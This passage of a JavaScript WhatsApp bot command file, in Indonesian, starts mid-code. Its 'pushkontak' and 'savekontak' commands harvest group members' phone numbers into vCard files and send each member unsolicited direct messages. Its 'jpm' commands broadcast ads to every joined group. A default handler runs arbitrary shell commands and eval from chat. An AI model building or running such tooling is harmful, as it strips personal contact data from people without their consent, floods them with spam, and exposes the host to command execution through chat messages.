try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:[PUSH BY DENZ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`⏤͟͟͞͞★𝚂𝚅 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺
Cek filenya di private cet
> _Subscribe_ YT IDRIS ID`)
await della.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: `File contact`, caption: `⏤͟͟͞͞★𝙵𝙸𝙻𝙴 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺
🌤️Succes Bang denz

‼️ Cara Menggunakan =
 • Download Filenya
 • Lalu Pencet Filenya
 • Import Ke Kontak
 • Pilih Email Yang Akan Digunakan 🤡
> _subscribe_ YT IDRIS ID`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "savekontak2": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await della.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply(`*Id GROUP* ❌
Cek kembali id gc
example _.listgc_`)
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN::[PUSH BY DENZ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Done, cek Filenya di privat cet`)
await della.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "𝙵𝚒𝚕𝚎 𝙲𝚘𝚗𝚝𝚊𝚌𝚝", caption: `⏤͟͟͞͞★𝙵𝙸𝙻𝙴 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺
🌤️Succes Bang denz

‼️ Cara Menggunakan =
 • Download Filenya
 • Lalu Pencet Filenya
 • Import Ke Kontak
 • Pilih Email Yang Akan Digunakan 🤡
> _Subscribe_ YT IDRIS ID
https//youtube.com/@denzstorex`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak": case "dellapush": case "pushgc": {
if (!isOwner) return m.reply(msg.owner)
if (!isGroup) return m.reply(msg.group)
if (!text) return m.reply(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`⏤͟͟͞͞★𝙿𝚄𝚂𝙷 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺

*DEV* : Denz
*MEMBER* : _${halls.length}_
*STATUS* : Memproses ...💫
> 👉👌`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await della.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(4000)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN::[PUSH BY DENZ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`⏤͟͟͞͞★𝙿𝚄𝚂𝙷 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺

*DEV* : Denz
*MEMBER* : _${halls.length}_
*STATUS* : _Berhasil....✅_
> File contact sudah di kirim ke private cet`)
await della.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "𝙵𝙸𝙻𝙴 𝙲𝙾𝙽𝚃𝙰𝙲𝚃", caption: `⏤͟͟͞͞★𝙵𝙸𝙻𝙴 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺
🌤️Succes Bang denz

‼️ Cara Menggunakan =
 • Download Filenya
 • Lalu Pencet Filenya
 • Import Ke Kontak
 • Pilih Email Yang Akan Digunakan 🤡
> _Subscribe_ YT IDRIS ID
https://youtube.com/@denzstorex`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak1": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text.split("|")[0]
var teks = text.split("|")[1]
var groupMetadataa
try {
groupMetadataa = await della.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*YG BENER AJA*")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`⏤͟͟͞͞★𝙿𝚄𝚂𝙷 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺

*DEV* : denz
*MEMBER* : ${halls.length}
*STATUR* : Memproses ....
> 👉👌`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await della.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(4000)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN::[PUSH BY DENZ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`⏤͟͟͞͞★𝙿𝚄𝚂𝙷 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺

*DEV* : denz
*MEMBER* : ${halls.length}
*STATUS* : Berhasil ...✅

> File Contact Berhasil Dikirim ke Private Chat`)
await della.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "𝙵𝙸𝙻𝙴 𝙲𝙾𝙽𝚃𝙰𝙲𝚃", caption: `⏤͟͟͞͞★𝙵𝙸𝙻𝙴 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺
🌤️Succes Bang denz

‼️ Cara Menggunakan =
 • Download Filenya
 • Lalu Pencet Filenya
 • Import Ke Kontak
 • Pilih Email Yang Akan Digunakan 🤡
> _Subscribe_ YT IDRIS ID
https://youtube.com/@denzstorex`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak2": case "pushkontakid": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply(`*Id GROUP* ❌
Cek kembali id gc
example _.listgc_`)
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await della.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`⏤͟͟͞͞★𝙿𝚄𝚂𝙷 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺

*Dev* : denz
*Membee* : ${halls.length}
*status* : Memproses ...💫
> 👉👌`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await della.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN::[PUSH BY DENZ] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`⏤͟͟͞͞★𝙿𝚄𝚂𝙷 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺

*DEV* : denz
*MEMBERR* : ${halls.length}
*STATUS* : Berhasil ...,✅ 
> File Contact Berhasil Dikirim ke Private Chat`)
await della.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: `⏤͟͟͞͞★𝙵𝙸𝙻𝙴 𝙲𝙾𝙽𝚃𝙰𝙲𝚃ꗄ➺
🌤️Succes Bang denz

‼️ Cara Menggunakan =
 • Download Filenya
 • Lalu Pencet Filenya
 • Import Ke Kontak
 • Pilih Email Yang Akan Digunakan 🤡
> _Subscribe_ YT IDRIS ID
https://youtube.com/@denzstorex`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "idgc": {
if (!isOwner) return m.reply(msg.owner)
if (!isGroup) return m.reply(msg.group)
m.reply(`${m.chat}`)
}
break
case "listgc": case "cekid": case "listgrup": {
if (!isOwner) return m.reply(msg.owner)
let gcall = Object.values(await della.groupFetchAllParticipating().catch(_=> null))
let listgc = `*｢ LIST ALL CHAT GRUP ｣*\n\n`
await gcall.forEach((u, i) => {
listgc += `•『 ${u.subject}\n • ⪼ ID : ${u.id}\n • ⪼ Member : ${u.participants.length} Member\n • ⪼ Pembuat : ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
}
)
m.reply(listgc)
}
break
case 'd':
case 'done':
case 'p':
case 'ok':
case 'svb':
case 'sv':
case 'y':
 della.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

break
case "backup": case "backupsc": 
case "sendsc": {
//if (!isOwner) return m.reply(msg.developer)
if (isOwner) {
m.reply("Memproses Mengambil Script Bot")
let a = getTime().split("T")[0]
let b = getTime().split("T")[1].split("+")[0]
var name = `BY-YT_IDRIS_ID`//`${a}◦${b}`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "sesion" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await della.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("*File backup* berhasil dikirim ke private chat")}
 else {
della.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: 99999999, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: `Buy Script ? Chat owner bot dengan cara ketik *.owner*\n\n*© ${namabot}*`, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}}
break

case "dn": case "selesai": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
if (!text.split(",")) return m.reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
const [barang, harga] = text.split(",")
if (isNaN(harga)) return m.reply("Format Harga Tidak Valid")
var total = `${harga}000000`
var total2 = Number(`${harga}000`)
const teks = `*TRANSAKSI DONE BY ${global.della} ✅*

*📦 Barang :* ${barang}
*💸 Nominal :* Rp${toRupiah(total2)}
*⏰ Waktu :* ${getTime().split("T")[0]}
*🔰 Channel :* ${global.linksaluran}
_*Terimakasih Sudah Mempercayai & Menggunakan Jasa ${global.della} 🥳*_
 *MASUK SALURAN CHANNEL AGAR MENDAPATKAN INFO-INFO TERBARU*`
della.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: Number(total), requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: `${teks}`, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}
break
case "startjpm": {
if (!isOwner) return m.reply(msg.owner)
var teksnya = await  fs.readFileSync("./all/database/teksjpm.js").toString()
if (teksnya.length < 1) return m.reply("Teks Jpm Tidak Ditemukan, Silahlan Isi/Edit Teks Jpm Didalam Folder all/database")
var teks = `${teksnya}`
let total = 0
let getGroups = await della.groupFetchAllParticipating()
let usergc = await Object.keys(getGroups)
m.reply(`Memproses Mengirim Pesan *Text* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
await della.sendMessage(jid, {text: teksnya, contextInfo: {externalAdReply: {thumbnailUrl: "https://telegra.ph/file/fba3ccdfa35b2cc099231.jpg", title: `𝗠𝗮𝗿𝗸𝗲𝘁𝗽𝗹𝗮𝗰𝗲 ${global.della}🌐`, body: "Klik Disini Untuk Membeli", sourceUrl: `https://wa.me/${global.owner}`, previewType: "PHOTO"}}}, {quoted: qloc})
total += 1
} catch {}
await sleep(4000)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpm": {
if (!isOwner) return m.reply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await della.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan *Text* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
await della.sendMessage(jid, {text: teks, contextInfo: {externalAdReply: {thumbnailUrl: "https://telegra.ph/file/fba3ccdfa35b2cc099231.jpg", title: `𝗠𝗮𝗿𝗸𝗲𝘁𝗽𝗹𝗮𝗰𝗲 ${global.della} 🌐`, body: "Klik Disini Untuk Membeli", sourceUrl: `https://wa.me/${global.owner}`, previewType: "PHOTO"}}}, {quoted: qloc})
total += 1
} catch {}
await sleep(4000)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpmtesti": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await della.downloadAndSaveMediaMessage(qmsg)
let idnya = global.idsaluran.length < 1 ? "-" : global.idsaluran
let total = 0
let getGroups = await della.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan *Teks & Foto* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
della.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true, forwardedNewsletterMessageInfo: {newsletterJid: idnya, serverMessageId: 100, 
newsletterName: `Testimoni By Denz`
}}}, {quoted: qloc})
total += 1
} catch {}
await sleep(4000)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break
case "addpanel": case "buatpanel": case "cpanel":{
if (!isOwner) return m.reply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0] || !args[1]) return m.reply(example("nama 2gb"))
if (!isNaN(args[0])) return m.reply(example("nama 2gb"))
var cpu
var ram
var disk
let username = args[0].toLowerCase()
if (args[1] == "1gb") {
cpu = "30"
ram = "1000"
disk = "1000"
} else if (args[1] == "2gb") {
cpu = "40"
ram = "2000"
disk = "2000"
} else if (args[1] == "3gb") {
cpu = "50"
ram = "3000"
disk = "2000"
} else if (args[1] == "4gb") {
cpu = "60"
ram = "4000"
disk = "2000"
} else if (args[1] == "5gb") {
cpu = "70"
ram = "5000"
disk = "2000"
} else if (args[1] == "6gb") {
cpu = "80"
ram = "6000"
disk = "3000"
} else if (args[1] == "7gb") {
cpu = "90"
ram = "7000"
disk = "3000"
} else if (args[1] == "8gb") {
cpu = "100"
ram = "8000"
disk = "3000"
} else if (args[1] == "9gb") {
cpu = "110"
ram = "9000"
disk = "3000"
} else if (args[1] == "10gb") {
cpu = "120"
ram = "10000"
disk = "4000"
} else if (args[1] == "11gb") {
cpu = "140"
ram = "11000"
disk = "5000"
} else if (args[1] == "12gb") {
cpu = "150"
ram = "12000"
disk = "5000"
} else if (args[1] == "unli" || args[1] == "unlimited") {
cpu = "0"
ram = "0"
disk = "4000"
} else {
return m.eply("Format Ram Tidak Ditemukan!")
}
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = getTime().split("T")[0]
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var teks = `
*SUCCESSFULLY CREATED ✅*
*┌ ◦* Username : ${user.username}
*│ ◦* Ram : *${ram == "0" ? "Unlimited" : ram.split("0")[0]+"GB"}*
*│ ◦* Cpu : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
*│ ◦* Disk : *${disk.charAt(0)+"GB"}*
*└ ◦* Password : *${password.toString()}*

*MASUK SALURAN KAMI*
${global.linksaluran}
`
della.sendMessage(m.chat, {text: teks, contextInfo:
{mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://img100.pixhost.to/images/234/535087860_verlangdev.jpg", title: "𝐋𝐎𝐆𝐈𝐍", body: `Login ke panel`, sourceUrl : `${domain}`,renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})}
//m.reply(teks)

break
case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!isOwner) return m.reply(msg.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let messageText = "*🌐 LIST SERVER PANEL BOT*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `*┌ ◦* ID Server *${s.id}*\n`;
messageText += `*│ ◦* Nama Server *${s.name}*\n`
messageText += `*│ ◦* Ram *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*\n`
messageText += `*│ ◦* CPU *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*\n`;
messageText += `*└ ◦* Storage *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await della.sendMessage(m.chat, { text: messageText }, { quoted: m })
}
break
case "delpanel": case "hapuspanel": {
if (!isOwner) return m.reply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
m.reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break
case "setpay": case "setpayment": {
if (!isOwner) return m.reply(msg.developer)
let a = args[0] ? /qris/g.test(args[0].toLowerCase()) : false
if (!args[0] || !args[1]) return m.reply(example(`${a ? "Qris https://url.foto" : "Dana 0838XXX"}`))
if (!/dana|gopay|ovo|qris/.test(args[0].toLowerCase())) return m.reply("Nama Payment Tidak Ditemukan!")
if (/qris/g.test(args[0])) {
if (!args[1].startsWith("https://")) return m.reply("untuk payment qris harus berupa link foto *QRIS*")
}
payment[args[0].toLowerCase()] = args[1]
await fs.writeFileSync('./all/database/payment.json', JSON.stringify(payment, null, 2))
m.reply(`Berhasil Mengubah Payment *${capital(args[0])}*`)
}
break
case "delpay": case "delpayment": {
if (!isOwner) return m.reply(msg.owner)
if (!args[0]) return m.reply(example(`Dana`))
if (!/dana|gopay|ovo/.test(args[0].toLowerCase())) return m.reply("Nama Payment Tidak Ditemukan!")
payment[args[0].toLowerCase()] = false
await fs.writeFileSync('./all/database/payment.json', JSON.stringify(payment, null, 2))
m.reply(`Berhasil Menghapus Payment *${capital(args[0])}*`)
}
break
case "sendpayment": case "payment": case "pay": case "listpayment": {
if (!isOwner) return m.reply(msg.owner)
let teks = `\t\t*｢ LIST ALL PAYMENT ｣*\n\n`
await Object.keys(payment).forEach((e) => {
if (e !== "qris") teks += ` *» ${capital(e)} :* ${payment[e] == false ? "Tidak Tersedia" : payment[e]}\n`
})
teks += ` *» QRIS :* Scan Foto Diatas\n\n`
teks += `_Wajib kirim bukti transfer demi keamanan bersama🙏_`
della.sendMessage(m.chat, {image: {url: payment.qris}, caption: teks})
}
break
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return della.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return della.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
della.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
della.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return della.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return della.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
della.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})